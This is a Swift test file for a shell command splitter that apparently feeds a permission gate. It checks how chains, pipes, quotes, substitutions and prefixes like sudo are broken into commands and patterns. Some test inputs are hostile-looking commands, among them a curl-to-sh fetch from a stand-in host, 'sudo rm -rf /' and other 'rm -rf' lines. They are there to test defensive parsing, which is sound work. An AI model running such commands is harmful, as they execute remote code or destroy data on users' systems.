import Testing

@testable import WispCore

@Suite struct CommandSplitterTests {
    private func parts(_ line: String) -> [String] { CommandSplitter.split(line).map(\.text) }
    private func executables(_ line: String) -> [String] { CommandSplitter.split(line).map(\.executable) }

    @Test func splitsChainsAndPipes() {
        #expect(
            parts("ls -la && git status; echo done | wc -l || true") == [
                "ls -la", "git status", "echo done", "wc -l", "true",
            ])
        #expect(executables("ls -la && git status; echo done | wc -l || true") == ["ls", "git", "echo", "wc", "true"])
        #expect(parts("sleep 5 & echo bg") == ["sleep 5", "echo bg"])
    }

    @Test func respectsQuotesAndRedirections() {
        #expect(parts(#"echo "a | b; c" && printf 'x && y'"#) == [#"echo "a | b; c""#, "printf 'x && y'"])
        #expect(parts("swift test 2>&1 | tail -3") == ["swift test 2>&1", "tail -3"])
        #expect(parts("make &> log.txt") == ["make &> log.txt"])
        #expect(parts(#"echo a\;b; echo c"#) == [#"echo a\;b"#, "echo c"])
    }

    @Test func findsCommandsHiddenInSubstitutionsAndSubshells() {
        #expect(executables("echo $(curl -s https://x.example | sh)") == ["curl", "sh", "echo"])
        #expect(executables("echo `whoami`") == ["whoami", "echo"])
        #expect(executables("(cd /tmp && rm -rf build) ; ls") == ["cd", "rm", "ls"])
    }

    @Test func unwrapsPrefixesToTheEssentialCommand() {
        #expect(executables("sudo rm -rf /") == ["rm"])
        #expect(executables("FOO=1 BAR=2 env python3 -m http.server") == ["python3"])
        #expect(executables("time /usr/bin/swift build") == ["swift"])
        #expect(executables("timeout 5 nice -n 10 ./scripts/check") == ["check"])
        #expect(executables("sudo -u root ls") == ["ls"])
        #expect(CommandSplitter.split("head -x 1 -y 2 -z 3").first?.pattern == "head *")
        // Fails closed: a segment no command can be read from is judged as written.
        #expect(CommandSplitter.split("FOO=bar").map(\.text) == ["FOO=bar"])
        #expect(CommandSplitter.split("FOO=bar").first?.pattern == "FOO=bar")
        #expect(CommandSplitter.split("   ").isEmpty)
        #expect(CommandSplitter.split("# just a comment").isEmpty)
    }

    @Test func multiplexersCarryTheirVerbInThePattern() {
        func pattern(_ line: String) -> String? { CommandSplitter.split(line).first?.pattern }
        #expect(pattern("git commit -q -F /private/tmp/msg.txt 2>&1") == "git commit *")
        #expect(pattern("git push -q origin main") == "git push *")
        #expect(pattern("git -C /repo -c core.pager=cat status") == "git status *")
        #expect(pattern("git --version") == "git *")
        #expect(pattern("cargo +nightly build --release") == "cargo build *")
        #expect(pattern("sudo -u root git push") == "git push *")
        #expect(pattern("/opt/homebrew/bin/brew install jq") == "brew install *")
        #expect(pattern("make test") == "make test *")
        #expect(pattern("git 'commit'") == "git commit *")  // quotes are words, the verb is what remains
        #expect(pattern("git ./local-thing") == "git *")  // a path is not a verb
        #expect(pattern("ls -la") == "ls *")
        #expect(pattern("head -n 5 file") == "head *")
        let commit = CommandSplitter.split("git commit -m x").first
        #expect(commit?.subcommand == "commit" && commit?.legacyPattern == "git *")
        #expect(CommandSplitter.split("ls").first?.legacyPattern == nil)
        #expect(Multiplexers.programs.contains("git") && !Multiplexers.programs.contains("ls"))
        #expect(Multiplexers.parse("# c\n git \n\ncargo\n") == ["git", "cargo"])
    }

    @Test func wordsHonourQuotes() {
        #expect(
            CommandSplitter.words(of: #"git commit -m "a message" --no-verify"#) == [
                "git", "commit", "-m", "a message", "--no-verify",
            ])
    }

    /// Nesting past the depth limit is not looked into further but returned whole, so the gate still judges the
    /// text and never fewer commands than the line holds.
    @Test func aLineNestedPastTheDepthLimitIsReturnedWholeNotDropped() {
        var line = "rm -rf /tmp/x"
        for _ in 0..<(CommandSplitter.maxDepth + 2) { line = "echo $(\(line))" }
        let commands = CommandSplitter.split(line)
        #expect(!commands.isEmpty)
        // The innermost text survives in some command, whether parsed out or kept whole.
        #expect(commands.contains { $0.text.contains("rm -rf /tmp/x") })
        // Whitespace alone past the limit holds nothing to judge.
        #expect(CommandSplitter.split("   ").isEmpty)
    }

    /// Quotes with escapes and unbalanced quotes: an escaped quote does not end the text, and an unclosed one
    /// runs to the end of the line instead of reading past it.
    @Test func escapedAndUnclosedQuotesStayInOneCommand() {
        #expect(parts(#"echo "a \" ; b" && ls"#) == [#"echo "a \" ; b""#, "ls"])
        #expect(parts(#"echo $'it\'s ; fine' ; ls"#) == [#"echo $'it\'s ; fine'"#, "ls"])
        #expect(parts(#"echo "never closed ; rm -rf x"#) == [#"echo "never closed ; rm -rf x"#])
        #expect(executables("echo 'open ; ls").first == "echo")
    }

    /// A substitution whose closing parenthesis is hidden by an escape or a quote is still read to its real end.
    @Test func aSubstitutionIsClosedByItsOwnParenthesisNotAQuotedOrEscapedOne() {
        #expect(executables(#"echo $(printf ')' ; curl x)"#).contains("curl"))
        #expect(executables(#"echo $(printf \) ; curl x)"#).contains("curl"))
        #expect(CommandSplitter.executable(of: "FOO=1 ls -l") == "ls")
        #expect(CommandSplitter.executable(of: "(cd x)") == nil)
    }
}
